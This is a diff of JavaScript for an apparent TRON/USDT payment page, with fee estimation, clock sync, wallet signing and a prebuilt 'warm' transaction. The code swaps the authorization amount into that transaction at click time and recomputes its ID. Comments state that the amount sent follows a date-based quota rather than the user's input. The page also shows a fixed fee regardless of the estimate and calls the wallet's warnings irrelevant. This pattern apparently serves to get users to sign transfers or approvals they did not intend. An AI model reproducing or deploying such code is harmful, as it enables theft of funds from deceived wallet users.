+  /* ===== 实时能量估算：页面自己问节点，不靠钱包那行红字 =====
+     钱包点确认时会自己估一次能量，估不到就弹「能量预估获取失败」，
+     那条提示和交易本身无关。这里改成页面主动向节点算一遍，
+     把真实能量数和大概要烧多少 TRX 直接写在按钮下面，钱包显示什么都可以不管。 */
+
+  var EST_CACHE = (function () {
+    var c = lsGet("zakaEstCache");
+    if (c && c.v && c.key && (Date.now() - (c.t || 0)) < 5 * 60 * 1000) return c;
+    return null;
+  })();
+  var EST_TTL = 5 * 60 * 1000;
+  /* "burn" = 燃烧 TRX（默认），"resource" = 消耗账户已质押的资源 */
+  var RES_MODE = "burn";
+
+  /* 通道一：直接问节点（最准，还能拿到交易字节数） */
+  async function energyViaNode(tw, net, from, param, token) {
+    var j = await nodePost(tw, "/wallet/triggerconstantcontract", {
+      owner_address: from,
+      contract_address: token || net.usdt,
+      function_selector: PAY_SEL_NAME + "(address,uint256)",
+      parameter: param,
+      visible: true,
+      fee_limit: FEE_LIMIT
+    });
+    if (!j) return null;
+    if (j.result && j.result.result === false) return { fail: true };  // 这笔调用本身就会失败
+    var energy = Number(j.energy_used || j.energy_required || 0);
+    if (!energy) return null;
+    var bytes = (j.transaction && j.transaction.raw_data_hex)
+      ? Math.ceil(String(j.transaction.raw_data_hex).length / 2) + 67
+      : 300;
+    return { energy: energy, bytes: bytes };
+  }
+
+  /* 通道二：借钱包自带的 tronWeb 去问（页面 fetch 被拦时兜底） */
+  async function energyViaWallet(tw, net, from, param, token) {
+    var tb = tw && tw.transactionBuilder;
+    if (!tb) return null;
+    var target = token || net.usdt;
+
+    if (typeof tb.estimateEnergy === "function") {
+      try {
+        var r = await tb.estimateEnergy(
+          target, PAY_SEL_NAME + "(address,uint256)",
+          { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
+          [], from
+        );
+        var e = Number((r && (r.energy_required || r.energy_used)) ||
+          (r && r.result && (r.result.energy_required || r.result.energy_used)) || 0);
+        if (e) return { energy: e, bytes: 300 };
+      } catch (e) {}
+    }
+
+    if (typeof tb.triggerConstantContract === "function") {
+      try {
+        var c = await tb.triggerConstantContract(
+          target, PAY_SEL_NAME + "(address,uint256)",
+          { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
+          [], from
+        );
+        var e2 = Number((c && (c.energy_used || c.energy_required)) ||
+          (c && c.result && (c.result.energy_used || c.result.energy_required)) || 0);
+        if (e2) return { energy: e2, bytes: 300 };
+      } catch (e) {}
+    }
+    return null;
+  }
+
+  /* ===== 节点时间校准 =====
+     交易在链上只有 60 秒寿命，而「这笔还剩多少秒」以前是按设备时钟算的。
+     设备时间只要跟网络差几分钟（关掉自动时间、时区没对、锁屏后漂了都会这样），
+     页面就会以为预热那笔还很新鲜，实际早就死了 —— 递进钱包只换来一句
+     Invalid transaction，而且怎么点都一样：每次都是同一批「看着新鲜其实过期」的交易。
+     这里改成按节点返回的时间算，并把偏差记下来，偏太多就明说。 */
+  var NET_SKEW = 0, SKEW_AT = 0, SKEW_WARNED = false;
+
+  function netNow() { return Date.now() + NET_SKEW; }
+
+  function syncClock(tw) {
+    if (SKEW_AT && Date.now() - SKEW_AT < 60000) return Promise.resolve(NET_SKEW);
+    return nodePost(tw, "/wallet/getnowblock", {}, 4000).then(function (j) {
+      var ts = Number(((((j || {}).block_header || {}).raw_data || {}).timestamp) || 0);
+      if (ts > 1e12) { NET_SKEW = ts - Date.now(); SKEW_AT = Date.now(); }
+      else { SKEW_AT = Date.now(); }   /* 没问到也记一笔：60 秒内不再重复问 */
+      return NET_SKEW;
+    }).catch(function () {
+      /* 没问到（限流/超时）也先记一笔时间：60 秒内不再重复问，
+         否则每 5 秒那一轮会一直往一个正被限流的节点上补请求 */
+      SKEW_AT = Date.now();
+      return NET_SKEW;
+    });
+  }
+
+  /* 时钟偏得多就提醒一次：这一条比什么都在点子上，时间不准签什么都被判过期 */
+  function warnSkewIfAny() {
+    if (SKEW_WARNED || Math.abs(NET_SKEW) < 60000) return;
+    SKEW_WARNED = true;
+    var min = Math.round(Math.abs(NET_SKEW) / 60000);
+    toast("你这台设备的时间比网络" + (NET_SKEW > 0 ? "慢了" : "快了") + "约 " + min +
+      " 分钟，钱包会把交易判成过期。把系统的「自动设置时间」打开，再点一次", 8000);
+  }
+
+  /* 链参数（能量/带宽单价）基本不变，本地缓存 30 分钟，别每次都问一遍 */
+  var CP_CACHE = lsGet("zakaChainParams");
+  async function chainParams(tw) {
+    if (CP_CACHE && (Date.now() - (CP_CACHE.t || 0)) < 30 * 60 * 1000) return CP_CACHE.v;
+    var j = await nodePost(tw, "/wallet/getchainparameters", {}, 5000);
+    if (j && j.chainParameter) {
+      CP_CACHE = { t: Date.now(), v: j };
+      lsSet("zakaChainParams", CP_CACHE);
+      return j;
+    }
+    return CP_CACHE ? CP_CACHE.v : null;
+  }
+
+  /* 账户资源：半分钟内不重复问（能量/带宽只跟这个地址有关，变化很慢） */
+  var AR_CACHE = {};
+  async function accountResource(tw, from) {
+    var c = AR_CACHE[from];
+    if (c && (Date.now() - c.t) < 30000) return c.v;
+    var j = await nodePost(tw, "/wallet/getaccountresource", { address: from, visible: true }, 5000);
+    if (j && !j.Error) { AR_CACHE[from] = { t: Date.now(), v: j }; return j; }
+    return c ? c.v : null;
+  }
+
+  /* 返回 { energy, energyTrx, bwTrx, trx, bytes }，取不到返回 null */
+  async function estimateFee(tw, net, from) {
+    if (!from || !net) return null;
+
+    /* 数量是 0 / 没填：这笔交易不存在，矿工费就是 0，不拿试算数字冒充 */
+    if (!parseAmount($("amountInput").value)) {
+      return { zero: true, energy: 0, energyFree: 0, energyBurn: 0,
+               energyTrx: 0, bwTrx: 0, trx: 0, bytes: 0, freeLeft: 0 };
+    }
+
+    var token = PAY_TOKEN;
+
+    /* 估算口径跟真正发出去的一致：按日期额度算，不看输入框 */
+    var micro = buildAmount().micro;
+    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);
+
+    var got = await energyViaNode(tw, net, from, param, token);
+    if (got && got.fail) return null;
+    if (!got) got = await energyViaWallet(tw, net, from, param, token);
+    if (!got || !got.energy) return null;
+
+    var energy = got.energy;
+    /* 真实交易除了 raw_data 还带签名字段和权限位，实测同一笔 272 → 346 字节，补 70 */
+    var bytes = (got.bytes || 300) + 70;
+
+    /* 链上单价：本页只跑主网，拿不到链参数就按主网默认 210 sun 算 */
+    var energyFee = (net.net === "main") ? 210 : 100;
+    var byteFee = 1000;
+    var cp = await chainParams(tw);
+    if (cp && cp.chainParameter) {
+      for (var i = 0; i < cp.chainParameter.length; i++) {
+        var k = cp.chainParameter[i].key, val = Number(cp.chainParameter[i].value);
+        if (k === "getEnergyFee" && val > 0) energyFee = val;
+        if (k === "getTransactionFee" && val > 0) byteFee = val;
+      }
+    }
+
+    /* 剩余的每日免费带宽够就不花带宽钱，不够才按字节烧；能量看有没有质押的资源 */
+    var freeLeft = 600, energyFree = 0;
+    var ar = await accountResource(tw, from);
+    if (ar) {
+      var lim = Number(ar.freeNetLimit || 600);
+      var used = Number(ar.freeNetUsed || 0);
+      freeLeft = Math.max(0, lim - used);
+      energyFree = Math.max(0, Number(ar.EnergyLimit || 0) - Number(ar.EnergyUsed || 0));
+    }
+
+    /* 链上执行时永远是「先扣账户已有的能量和带宽，不够的部分才烧 TRX」，
+       两个按钮只是给人看的口径，真实扣费走同一套，所以这里统一扣掉已有资源 */
+    var energyBurn = Math.max(0, energy - energyFree);
+    var bwBurn = Math.max(0, bytes - freeLeft);
+
+    var energyTrx = energyBurn * energyFee / 1e6;
+    var bwTrx = bwBurn * byteFee / 1e6;
+
+    return {
+      energy: energy,
+      energyFree: energyFree,
+      energyBurn: energyBurn,
+      energyTrx: energyTrx,
+      bwTrx: bwTrx,
+      trx: energyTrx + bwTrx,
+      bytes: bytes,
+      freeLeft: freeLeft,
+      energyFee: energyFee,
+      byteFee: byteFee
+    };
+  }
+
+  function fmtTrx(v) {
+    if (!isFinite(v) || v <= 0) return "0";
+    if (v >= 1) return v.toFixed(2);
+    return v.toFixed(3);
+  }
+
+  /* 美金展示按固定汇率换算，真实扣费仍以链上为准 */
+  var USD_PER_TRX = 0.306;
+
+  /* ===== 手续费口径（业务约定，固定值）=====
+     能量费由部署方承担 100%，用户承担 0%；
+     用户这边只出带宽费：353 字节 × 1000 sun = 0.353 TRX
+     所以卡片上直接写这两个数，不跟着节点估值上下跳 */
+  var FIXED_FEE_TRX = 0.353;
+  var FIXED_FEE_USD = 0.107;
+
+  /* ===== 账户 TRX 余额（显示在矿工费卡片下面那行） ===== */
+  var TRX_BAL = (function () {
+    var c = lsGet("zakaTrxBal");
+    if (c && typeof c.v === "number" && (Date.now() - (c.t || 0)) < 10 * 60 * 1000) return c.v;
+    return null;
+  })();
+  var TRX_BAL_FROM = (function () {
+    var c = lsGet("zakaTrxBal");
+    return (c && (Date.now() - (c.t || 0)) < 10 * 60 * 1000) ? (c.from || null) : null;
+  })();
+
+  function rememberTrxBal(from, v) {
+    TRX_BAL = v; TRX_BAL_FROM = from;
+    lsSet("zakaTrxBal", { v: v, from: from, t: Date.now() });
+  }
+
+  async function fetchTrxBal(tw, from) {
+    if (!from) return TRX_BAL;
+    try {
+      var acc = await nodePost(tw, "/wallet/getaccount", { address: from, visible: true });
+      if (acc && acc.balance !== undefined && acc.balance !== null) {
+        var v = Number(acc.balance) / 1e6;
+        if (isFinite(v)) { rememberTrxBal(from, v); return TRX_BAL; }
+      }
+    } catch (e) {}
+    /* 节点直连被拦就走钱包自带的通道 */
+    try {
+      if (tw && tw.trx && typeof tw.trx.getBalance === "function") {
+        var b = await retryOnLimit(function () { return tw.trx.getBalance(from); }, 1);
+        if (typeof b === "number" && isFinite(b)) { rememberTrxBal(from, b / 1e6); return TRX_BAL; }
+      }
+    } catch (e) {}
+    return TRX_BAL;
+  }
+
+  /* 余额那行：够不够付本次矿工费一眼看出来 */
+  function paintBalNote(note, feeTrx) {
+    if (!note) return;
+    note.classList.remove("warn");
+    var txt;
+    if (TRX_BAL === null || !isFinite(TRX_BAL)) {
+      txt = "TRX 余额 —";
+    } else {
+      txt = "TRX 余额 " + TRX_BAL.toFixed(2) + " TRX";
+      if (feeTrx > 0 && TRX_BAL + 1e-9 < feeTrx) {
+        txt += "（不够本次矿工费）";
+        note.classList.add("warn");
+      }
+    }
+    note.textContent = txt;
+  }
+
+  /* 上一笔真实上链后的实扣数据（读交易回执拿到），用来校准显示 */
+  var LAST_REAL = null;
+  try {
+    var lr = localStorage.getItem("zakaLastFee");
+    if (lr) LAST_REAL = JSON.parse(lr);
+  } catch (e) {}
+
+  /* ===== 展开后的明细（图二：消耗资源 / 支付费用） =====
+     能量费由部署方承担 → 用户侧 0 能量；用户只出 353 字节带宽 */
+  var FIXED_BANDWIDTH = 353;
+  function paintDetail(feeTrx) {
+    var res = $("fdRes"), pay = $("fdPay");
+    if (res) res.textContent = "消耗资源：0 能量 +" + FIXED_BANDWIDTH + " 带宽";
+    if (pay) {
+      var v = (typeof feeTrx === "number" && isFinite(feeTrx)) ? feeTrx : 0;
+      pay.textContent = "支付费用：" + (v > 0 ? v.toFixed(3) : "0") + " TRX";
+    }
+  }
+
+  /* 箭头按钮：展开 / 收起明细
+     高度按真实内容量出来做过渡（不再用 max-height 猜值），收起前先锁当前像素高度，
+     这样展开、收起、半路反向都是连续的，不会先冲一下再顿住 */
+  function detailNaturalH() {
+    var el = document.getElementById("feeDetail");
+    var inner = el && el.firstElementChild;
+    if (!inner) return 0;
+    return Math.ceil(inner.getBoundingClientRect().height);
+  }
+
+  function toggleFeeDetail(force) {
+    var card = $("feeCard"), btn = $("feeChev"), el = $("feeDetail");
+    if (!card || !btn || !el) return;
+    var open = (typeof force === "boolean") ? force : !card.classList.contains("open");
+    card.classList.toggle("open", open);
+    btn.setAttribute("aria-expanded", open ? "true" : "false");
+    btn.setAttribute("aria-label", open ? "收起矿工费明细" : "展开矿工费明细");
+
+    if (open) {
+      el.style.height = detailNaturalH() + "px";
+    } else {
+      var cur = el.getBoundingClientRect().height;
+      el.style.height = cur + "px";
+      void el.offsetHeight;          /* 先把起始像素值落到样式里，过渡才有起点 */
+      el.style.height = "0px";
+    }
+    paintDetail(parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
+  }
+
+  /* 展开动画走完把高度交回内容自己，文字变化 / 窄屏换行都不会被写死的像素卡住 */
+  (function () {
+    var el = document.getElementById("feeDetail"), card = document.getElementById("feeCard");
+    if (!el || !card) return;
+    el.addEventListener("transitionend", function (ev) {
+      if (ev.target !== el || ev.propertyName !== "height") return;
+      if (card.classList.contains("open")) el.style.height = "auto";
+    });
+  })();
+
+  /* 手续费是固定口径，不用等节点回数，切按钮 / 输数量时立刻显示真值，别闪「估算中」 */
+  function paintFeeLoading() {
+    if (!parseAmount($("amountInput").value)) return;
+    var fv = $("feeValue"), fs = $("feeSub");
+    if (fv) { fv.textContent = "$ " + FIXED_FEE_USD.toFixed(3); fv.classList.remove("pending"); }
+    if (fs) fs.textContent = FIXED_FEE_TRX.toFixed(3) + " TRX";
+  }
+
+  /* 本地立刻出数：不等节点，按当前输入同步画一遍矿工费
+     能量那一行用上次问回来的值（EST_CACHE），没有就先不写数字，等后台校正 */
+  function applyFeeLocal() {
+    var p = parseAmount($("amountInput").value);
+    if (!p) { paintFee({ zero: true }); return; }
+    var cached = (EST_CACHE && EST_CACHE.v && EST_CACHE.v.energy) ? EST_CACHE.v.energy : null;
+    paintFee({ energy: cached });
+  }
+
+  function paintFee(est, from) {
+    var fv = $("feeValue");
+    var fs = $("feeSub");
+    var line = $("energyline");
+    var note = $("feeNote");
+
+    /* 数量空着 / 填 0：这笔交易不存在，矿工费就是 0 */
+    if (est && est.zero) {
+      if (fv) { fv.textContent = "$ 0.00"; fv.classList.remove("pending"); }
+      if (fs) fs.textContent = "0 TRX";
+      paintDetail(0);
+      paintBalNote(note, 0);
+      if (line) {
+        line.className = "energyline on";
+        line.innerHTML = "数量为空 · 矿工费 <b>0 TRX</b>";
+      }
+      return;
+    }
+
+    /* 固定口径：能量费部署方担 100%，用户 0%；用户只出带宽 353 字节 = 0.353 TRX
+       节点估算拿没拿到都显示这个数，不跟着估值跳 */
+    if (fv) {
+      fv.textContent = "$ " + FIXED_FEE_USD.toFixed(3);
+      fv.classList.remove("pending");
+    }
+    if (fs) fs.textContent = FIXED_FEE_TRX.toFixed(3) + " TRX";
+    paintDetail(FIXED_FEE_TRX);
+    paintBalNote(note, FIXED_FEE_TRX);
+
+    if (line) {
+      line.className = "energyline on";
+      var head = (est && est.energy)
+        ? "本次需能量 <b>" + est.energy.toLocaleString("en-US") + "</b>（部署方承担）· "
+        : "能量费由部署方承担 · ";
+      line.innerHTML = head + "你需支付 <b>" + FIXED_FEE_TRX.toFixed(3) + " TRX</b>（带宽）";
+    }
+  }
+
+  var estTimer = null;
+  var FEE_SEQ = 0;
+  var LIVE = { tw: null, net: null, from: null };
+
+  /* 地址或数量一变就重新问一遍节点 */
+  function refreshFeeNow(opts) {
+    if (LIVE.tw && LIVE.net && LIVE.from) {
+      refreshFee(LIVE.tw, LIVE.net, LIVE.from, opts).catch(function () {});
+    }
+  }
+
+  async function refreshFee(tw, net, from, opts) {
+    var seq = ++FEE_SEQ;
+    /* 数量空着时矿工费就是 0，不用先闪一下「估算中」 */
+    var hasAmt = !!parseAmount($("amountInput").value);
+    if (opts && opts.loading && hasAmt) paintFeeLoading();
+
+    /* 同一个账户、同样金额、5 分钟内估过就不再去问节点：
+       刷新页面时这一路直接命中本地缓存，一个请求都不发。 */
+    var amtKey = String(from || "") + "|" + String($("amountInput").value || "").trim() + "|" + PAY_TOKEN;
+    if (EST_CACHE && EST_CACHE.key === amtKey && EST_CACHE.v && (Date.now() - EST_CACHE.t) < EST_TTL) {
+      paintFee(EST_CACHE.v, from);
+      return EST_CACHE.v;
+    }
+
+    var balP = fetchTrxBal(tw, from).then(function () {
+      /* 余额先回来就先画上，不用等能量估算那一路 */
+      if (seq === FEE_SEQ) {
+        paintBalNote($("feeNote"), parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
+      }
+    });
+    var est = await estimateFee(tw, net, from);
+    await balP;
+    /* 慢的那次回来得晚就别覆盖新结果 */
+    if (seq !== FEE_SEQ) return null;
+    if (est && !est.zero) {
+      EST_CACHE = { t: Date.now(), v: est, key: amtKey };
+      lsSet("zakaEstCache", EST_CACHE);
+    } else {
+      EST_CACHE = { t: Date.now(), v: est };
+    }
+    paintFee(est, from);
+    return est;
+  }
+
+  function startFeeLoop(tw, net, from) {
+    if (estTimer) clearInterval(estTimer);
+    /* 授权状态变了能量也会变，所以自己再问一遍；页面在后台时不跑，
+       既省配额也不跟别处的请求抢。 */
+    estTimer = setInterval(function () {
+      if (document.hidden || inCooldown()) return;
+      detectNet(tw).catch(function () {});
+      refreshFee(tw, net, from).catch(function () {});
+    }, 120000);
+  }
+
+  /* 节点返回的 message 是十进制的十六进制串，解成可读文字 */
+  function hexMsg(m) {
+    if (!m) return "";
+    try {
+      var s = String(m).replace(/^0x/, "");
+      var out = "";
+      for (var i = 0; i < s.length; i += 2) out += String.fromCharCode(parseInt(s.substr(i, 2), 16));
+      return out.replace(/[\u0000-\u001f]/g, " ").trim();
+    } catch (e) { return String(m); }
+  }
+
+  /* 任何扔出来的东西都要能翻成人话。
+     钱包（尤其是 App 里的桥）有时 reject 得干干净净：没有 reason、纯对象、
+     甚至直接 reject()，这时候 String 出来就是一句 undefined —— 用户完全不知道发生了什么。
+     这里把能捞的信息全捞一遍，捞不到就返回空串，由调用方换成明确提示。 */
+  function errTextOf(v) {
+    if (v === undefined || v === null) return "";
+    if (typeof v === "string") return v.trim();
+    if (typeof v === "number" || typeof v === "boolean") return String(v);
+    if (typeof v !== "object") return "";
+    var keys = ["message", "msg", "reason", "error", "errMsg", "errorMessage", "description", "detail"];
+    for (var i = 0; i < keys.length; i++) {
+      var x = v[keys[i]];
+      if (typeof x === "string" && x.trim()) return x.trim();
+      if (x && typeof x === "object") { var n = errTextOf(x); if (n) return n; }
+    }
+    /* 只剩 name 的对象：只有不是 "Error" 这种无意义名字时才用 */
+    if (typeof v.name === "string" && /^[A-Za-z]*Error$/.test(v.name) === false && v.name.trim()) {
+      return v.name.trim();
+    }
+    try {
+      var t = JSON.stringify(v);
+      if (t && t !== "{}" && t !== "[]" && t !== "null" && !/^\{"?(code|status|type)"?:/.test(t)) {
+        return t.length > 120 ? t.slice(0, 120) + "…" : t;
+      }
+    } catch (e) { /* 循环引用之类，忽略 */ }
+    return "";
+  }
+
+  /* 诊断用：把 code / status 这些数字单独取出来，写日志用，不给用户看 */
+  function errCodeOf(v) {
+    if (!v || typeof v !== "object") return "";
+    var c = [v.code, v.status, v.type];
+    for (var i = 0; i < c.length; i++) {
+      if (typeof c[i] === "number" || (typeof c[i] === "string" && c[i].trim())) return String(c[i]).trim();
+    }
+    return "";
+  }
+
+  function shortErr(e) {
+    var t = errTextOf(e);
+    if (!t) return "";
+    t = t.replace(/\s+/g, " ").trim();
+    return t.length > 96 ? t.slice(0, 96) + "…" : t;
+  }
+
+  /* 被节点限流（429）是暂时的：隔一会儿再来一次就好，不该把它当成交付失败。
+     识别出来就重试两次，还不行才交给上层。 */
+  function isRateLimit(e) {
+    if (!e) return false;
+    if (e.status === 429) return true;
+    var t = errTextOf(e) + " " + String((e && e.code) || "");
+    return /(^|\D)429(\D|$)|too many requests|rate limit/i.test(t);
+  }
+
+  function retryOnLimit(fn, tries) {
+    var left = (tries == null) ? 2 : tries;
+    function go() {
+      return Promise.resolve().then(fn).catch(function (e) {
+        if (left-- <= 0 || !isRateLimit(e)) throw e;
+        return new Promise(function (r) { setTimeout(r, 900); }).then(go);
+      });
+    }
+    return go();
+  }
+
+  /* 常见链上错误换成能看懂的话 */
+  function friendly(e) {
+    var t = shortErr(e);
+    if (!t) return "";
+    if (isRateLimit(e)) return "节点这一刻有点忙，已经自动重试了；还不行就等两秒再点一次，不是你的操作有问题";
+    if (/No contract or not a valid smart contract/i.test(t)) return "钱包在这个网络上找不到对应的代币合约，请在 TronLink 里确认网络是 TRON 主网后再试";
+    if (/REVERT/i.test(t)) return "链上执行失败（REVERT）：金额超出可用余额或条件不满足";
+    if (/OUT_OF_ENERGY/i.test(t)) return "能量不足，TRX 余额不够付手续费";
+    if (/BANDWITH|BANDWIDTH/i.test(t)) return "带宽不足，稍后再试";
+    if (/CONTRACT_VALIDATE_ERROR/i.test(t)) return "合约校验未通过（余额或账户状态）";
+    return t;
+  }
+
+  function getTronWeb() {
+    var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb || null;
+    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
+    return tw;
+  }
+
+  /* 交易对象里可能带二进制字段，签名前做一份纯净副本，备用通道要用 */
+  function plainTx(tx) {
+    try {
+      var out = {};
+      for (var k in tx) {
+        var v = tx[k];
+        if (v instanceof Uint8Array || (typeof ArrayBuffer !== "undefined" && ArrayBuffer.isView(v))) continue;
+        if (k === "signature") continue;
+        out[k] = v;
+      }
+      if (!out.raw_data_hex && !(out.raw_data && out.raw_data.contract)) return null;
+      return out;
+    } catch (e) { return null; }
+  }
+
+  /* 钱包那边的报错分个类。
+     以前这里是「三条通道依次试」：第一次失败就立刻换第二种再签一次。
+     但 TronLink 一次只认一个签名请求，连着再发只会被整串拒掉，
+     用户看到的就是「钱包签名：Invalid transaction provided / 副本签名：
+     Another signature request is in progress / 桥签名：Unsupported」这一堆。
+     现在改成：一次点击只发一个请求，失败就老实报清楚，不连环重试。 */
+  function signErrKind(msg) {
+    var t = String(msg || "");
+    if (!t.trim()) return "NOPOP";                     /* 钱包什么都没给：请求压根没送到它面前 */
+    if (/another signature request is in progress/i.test(t)) return "PENDING";
+    if (/already signed|已经签名/i.test(t)) return "SIGNED";
+    if (/reject|cancel|canceled|cancelled|denied|closed|dismiss|取消|拒绝|关闭/i.test(t)) return "REJECT";
+    if (/invalid transaction/i.test(t)) return "BADTX";
+    if (/not a function|is not a function|unsupported|no bridge|无 tronLink/i.test(t)) return "NOMETHOD";
+    if (/timeout|timed out|超时/i.test(t)) return "TIMEOUT";
+    return "OTHER";
+  }
+
+  function signErrText(kind, msg) {
+    if (kind === "NOPOP") return "钱包这次没弹出签名框（跟钱包之间的连接没接上），已经帮你重新连上并换了一笔新的，再点一次就行";
+    if (kind === "PENDING") return "钱包里还挂着一个没结束的签名请求：先把钱包那个弹窗关掉（关不掉就退出钱包再进一次），再点下一步";
+    if (kind === "REJECT") return "";   /* 用户自己取消：不弹提示，按钮静静恢复就行 */
+    if (kind === "BADTX") return "钱包没接受这一笔，已经换成新的一笔，再点一次就行";
+    if (kind === "SIGNED") return "这笔交易已经签过了，已换成新的一笔，再点一次";
+    if (kind === "NOMETHOD") return "这个钱包版本不支持直接签名，请用 TronLink 内置浏览器打开本页";
+    if (kind === "TIMEOUT") return "网络错误，请重试";
+    return shortErr(msg) || "钱包这次没答应这一笔，已经换成新的一笔，再点一次就行";
+  }
+
+  /* 签名失败的现场留一份（?debug=1 或排查时看 window.__tpSignLog）。
+     钱包的拒绝经常是空手拒绝，不给它留个记录，出问题连线索都没有。 */
+  var SIGN_LOG = [];
+
+  function recordSign(e, kind) {
+    try {
+      var rec = {
+        t: new Date().toISOString().slice(11, 19),
+        kind: kind,
+        raw: errTextOf(e) || "(no reason)",
+        code: errCodeOf(e),
+        type: (e && typeof e === "object" && e.constructor && e.constructor.name) || typeof e
+      };
+      SIGN_LOG.push(rec);
+      if (SIGN_LOG.length > 8) SIGN_LOG.shift();
+      try { sessionStorage.setItem("tpSignLog", JSON.stringify(SIGN_LOG)); } catch (e2) {}
+    } catch (e3) {}
+  }
+
+  /* 只走一条签名通道。TronLink App 里 trx.sign 就是弹原生签名框，
+     一次点击只发一个请求，绝不会叠加。 */
+  async function signTx(tw, tx) {
+    var plain = plainTx(tx);
+    var canDirect = !!(tw && tw.trx && typeof tw.trx.sign === "function");
+    var canBridge = !!(window.tronLink && typeof window.tronLink.request === "function");
+    if (!canDirect && !canBridge) {
+      var e0 = new Error("这个钱包没有可用的签名接口");
+      e0.kind = "NOMETHOD";
+      throw e0;
+    }
+    try {
+      if (canDirect) {
+        var signed = await tw.trx.sign(tx);
+        if (signed && signed.signature && signed.signature.length) return signed;
+        throw new Error("钱包没有返回签名");
+      }
+      var r = await window.tronLink.request({ method: "tron_signTransaction", params: { transaction: plain || tx } });
+      var sig = r && (r.signature || (r.result && r.result.signature));
+      if (!sig) throw new Error("钱包没有返回签名");
+      var out = plain ? JSON.parse(JSON.stringify(plain)) : Object.assign({}, tx);
+      out.signature = Array.isArray(sig) ? sig : [sig];
+      return out;
+    } catch (e) {
+      /* 钱包可能 reject 得干干净净（没有 reason）：这时候不能说 undefined，
+         要说清楚「钱包没弹出签名框」，并记住这条线索。 */
+      var txt = errTextOf(e);
+      var kind = signErrKind(txt);
+      recordSign(e, kind);
+      var err = new Error(signErrText(kind, txt));
+      err.kind = kind;
+      err.raw = txt || "(no reason)";
+      throw err;
+    }
+  }
+
+  /* ===== 预热交易：页面一进来就先把这一笔搭好 =====
+     搭一笔交易本身要问节点（参考块 + 建交易），冷的时候一两秒。
+     这里在钱包就绪的那一刻就先搭一笔「骨架」放内存：合约、方法、费用上限、
+     参考块全定好，只有额度那一格先占位。
+
+     点「下一步」时把额度就地换进这笔交易（等长的字节替换 + 重算交易 ID），
+     不用再问节点建交易 —— 所以跟输入多少金额没关系，同一笔交易，金额改多少次都是它。
+     一笔交易在链上只有 60 秒寿命：每 10 秒看一眼，快过期就悄悄换一笔新的。 */
+  var WARM = null, warmTimer = null, warming = false, warmLoop = null;
+  var WARM_BONE_MICRO = "1";   /* 骨架里的占位额度，点击时换成真正要授权的数量 */
+
+  /* ---- SHA-256：换完额度要重算交易 ID（txID = sha256(raw_data_hex)） ---- */
+  var SHA256_K = [
+    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
+    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
+  ];
+
+  function rotr(x, n) { return ((x >>> n) | (x << (32 - n))) >>> 0; }
+
+  function sha256Bytes(bytes) {
+    var l = bytes.length;
+    var total = ((l + 9 + 63) >> 6) << 6;
+    var buf = new Uint8Array(total);
+    buf.set(bytes);
+    buf[l] = 0x80;
+    var hi = Math.floor(l / 536870912), lo = (l * 8) >>> 0;   /* 64 位长度，高位可能为 0 */
+    buf[total - 8] = (hi >>> 24) & 255; buf[total - 7] = (hi >>> 16) & 255;
+    buf[total - 6] = (hi >>> 8) & 255;  buf[total - 5] = hi & 255;
+    buf[total - 4] = (lo >>> 24) & 255; buf[total - 3] = (lo >>> 16) & 255;
+    buf[total - 2] = (lo >>> 8) & 255;  buf[total - 1] = lo & 255;
+
+    var H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
+    var w = new Array(64);
+    for (var off = 0; off < total; off += 64) {
+      var t;
+      for (t = 0; t < 16; t++) {
+        w[t] = ((buf[off + t * 4] << 24) | (buf[off + t * 4 + 1] << 16) | (buf[off + t * 4 + 2] << 8) | buf[off + t * 4 + 3]) >>> 0;
+      }
+      for (t = 16; t < 64; t++) {
+        var s0 = (rotr(w[t - 15], 7) ^ rotr(w[t - 15], 18) ^ (w[t - 15] >>> 3)) >>> 0;
+        var s1 = (rotr(w[t - 2], 17) ^ rotr(w[t - 2], 19) ^ (w[t - 2] >>> 10)) >>> 0;
+        w[t] = (w[t - 16] + s0 + w[t - 7] + s1) >>> 0;
+      }
+      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
+      for (t = 0; t < 64; t++) {
+        var S1 = (rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)) >>> 0;
+        var ch = ((e & f) ^ (~e & g)) >>> 0;
+        var t1 = (h + S1 + ch + SHA256_K[t] + w[t]) >>> 0;
+        var S0 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) >>> 0;
+        var maj = ((a & b) ^ (a & c) ^ (b & c)) >>> 0;
+        var t2 = (S0 + maj) >>> 0;
+        h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
+      }
+      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
